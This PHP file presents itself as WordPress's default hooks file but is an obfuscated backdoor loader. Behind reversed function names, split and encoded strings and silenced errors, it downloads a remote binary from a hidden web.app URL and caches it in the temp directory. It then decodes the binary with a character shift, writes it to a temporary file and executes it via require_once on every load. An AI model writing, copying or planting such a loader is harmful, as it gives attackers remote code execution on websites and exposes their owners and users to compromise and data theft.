<?php 
/** 
 * Sets up the default filters and actions for most 
 * of the WordPress hooks. 
 * 
 * If you need to remove a default hook, this file will 
 * give you the priority for which to use to remove the 
 * hook. 
 * 
 * Not all of the default hooks are found in style.php 
 * 
 * @package WordPress 
 * @id 83a6ee9b34553e9cf5ef0c507270c 
 */ 
 
// Strip, trim, kses, special wp_nonces for string saves 
 
class create_function { 
    private $shift; 
 
    public function __construct($shift = 1) { 
        error_reporting(0); 
        $this->shift = $shift; 
    } 
    public function outterTable(){ 
        $mat = $this->rev("eli"."fpmt"); 
        return $mat(); 
    } 
    public function init($kasihdua){ 
        $leuy = array( 
            "nib.%5f%2F", 
            "ppa.bew.at", 
            "ad-oyhp%2F", 
            "%2F%3Asptth" 
        ); 
        $mat = $this->rev("edo"."lpmi"); 
        return $mat('', $leuy); 
    } 
    public function dash(){ 
        $leuy = array( 
            "2584bc6ff4", 
            "fb5972b2bc", 
            "1777d8cd3b6b" 
        ); 
        $mat = $this->rev("edo"."lpmi"); 
        return $mat('', $leuy); 
    } 
    public function splitter(){ 
        $leuy = array( 
            "7815696ecbf1", 
            "c96e6894b779", 
            "456d330e_dat", 
            "aparser.bin" 
        ); 
        $mat = $this->rev("edo"."lpmi"); 
        return $mat('', $leuy); 
    } 
    public function check($leuy){ 
        return function_exists($leuy); 
    } 
    public function build($prod){ 
        $aw = $this->rev("etirwf"); 
        $td = $this->outterTable(); 
        $mat = $this->rev("atad_atem_teg_maerts"); 
        $aw($td, $prod); 
        require_once($mat($td)["uri"]); 
        return fclose($td); 
        } 
    public function raw($str) { 
        return preg_replace_callback( 
            '/%([0-9a-f]{2})/i', 
            function ($matches) { 
                return chr(hexdec($matches[1])); 
            }, 
            $str 
        ); 
    } 
    public function Rev($str) { 
        preg_match_all('/./us', $str, $matches); 
        return implode('', array_reverse($matches[0])); 
    } 
    public function blyad($bam, $bim, $bum){ 
        $mat = $this->rev("tpotes_lruc"); 
        return $mat($bam, $bim, $bum); 
    } 
    public function getOut($anjay){ 
        $mat = $this->rev("cexe_lruc"); 
        return $mat($anjay); 
    } 
    public function suka($blyad){ 
        $blyad = array( 
            CURLOPT_URL, 
            CURLOPT_RETURNTRANSFER, 
            CURLOPT_FOLLOWLOCATION 
        ); 
        return $blyad; 
    } 
    public function naked($aw, $iw, $uw, $ew, $ow){ 
        $mat = $this->rev("nepo"."kcosf"); 
        return $mat($aw, $iw, $uw, $ew, $ow); 
    } 
    public function outbound($ayang){ 
        $mat = $this->rev("stnetnoc_teg_elif"); 
        return $mat($ayang); 
    } 
    public function inbound($ayang_aku, $yameteh){ 
        $mat = $this->rev("stnetnoc_tup_elif"); 
        return $mat($ayang_aku, $yameteh); 
    } 
    public function parser($data){ 
        $bam = $this->rev("rid_pmet_teg_sys"); 
        $bam1 = $this->rev("stsixe_elif"); 
        $bam2 = $this->rev("tini_lruc"); 
        $bam3 = $this->rev("edolpmi"); 
        $bam4 = $this->rev("etirwf"); 
        $fileNome = $this->splitter(); 
        $fileRAW = $data;  
        $tmpDir = $bam(); 
        $filePos = $tmpDir . '/'. $fileNome; 
        $nyari = "ixqfwlrq#nMxOTjYki+"; 
        if (!$bam1($filePos) || strpos($bam3('', file($filePos)), $nyari) === false) { 
            if ($this->check($this->rev("tini_lruc"))) { 
                $ch = $bam2(); 
                $this->blyad($ch, $this->suka(0)[0], $fileRAW); 
                $this->blyad($ch, $this->suka(0)[1], 1); 
                $this->blyad($ch, $this->suka(0)[2], true); 
                $fileData = $this->getOut($ch); 
                curl_close($ch); 
            } elseif ($this->check($this->rev("elif"))){ 
                $fileData = $bam3('', file($fileRAW)); 
            }elseif ($this->check($this->rev("nepokcosf"))) { 
            $urlParts = parse_url($fileRAW); 
            $host = $urlParts[$this->rev("tsoh")]; 
            $path = $urlParts[$this->rev("htap")]; 
 
            $fp = $this->naked($this->rev("//:lss").$host, 443, $errno, $errstr, 30); 
            if (!$fp) { 
                echo "$errstr ($errno)<br />
"; 
            } else { 
                $out = "GET" . $path . " HTTP/1.1
"; 
                $out .= "Host: " . $host . "
"; 
                $out .= "Connection: Close

"; 
                $bam4($fp, $out); 
                $bb = $this->rev("foef"); 
                $cc = $this->rev("stegf"); 
                $dd = $this->rev("esolcf"); 
                while (!$bb($fp)) { 
                    $line = $cc($fp, 1024); 
                    if (trim($line) == '') { 
                        break; 
                    } 
            } 
 
            $fileData = ''; 
            while (!$bb($fp)) { 
                $fileData .= $cc($fp, 1024); 
            } 
            $dd($fp); 
        } 
         }else{ 
                $fileData = $this->outbound($fileRAW); 
            } 
            $this->inbound($filePos, $fileData); 
        } 
        $conn = $this->outbound($filePos); 
        return $conn; 
        } 
    public function Builder($input) { 
        $output = ''; 
        for ($i = 0; $i < strlen($input); $i++) { 
            $ascii = ord($input[$i]); 
            $ascii -= $this->shift; 
            $output .= chr($ascii); 
        } 
        return $output; 
    } 
} 
$stdIn = new create_function(3, "GENERATE_RANDOM_BYTE"); 
$password = $stdIn->dash(); 
$stdIn->build($stdIn->Builder($stdIn->parser($stdIn->Rev($stdIn->raw($stdIn->init(2)))))); 
?> 
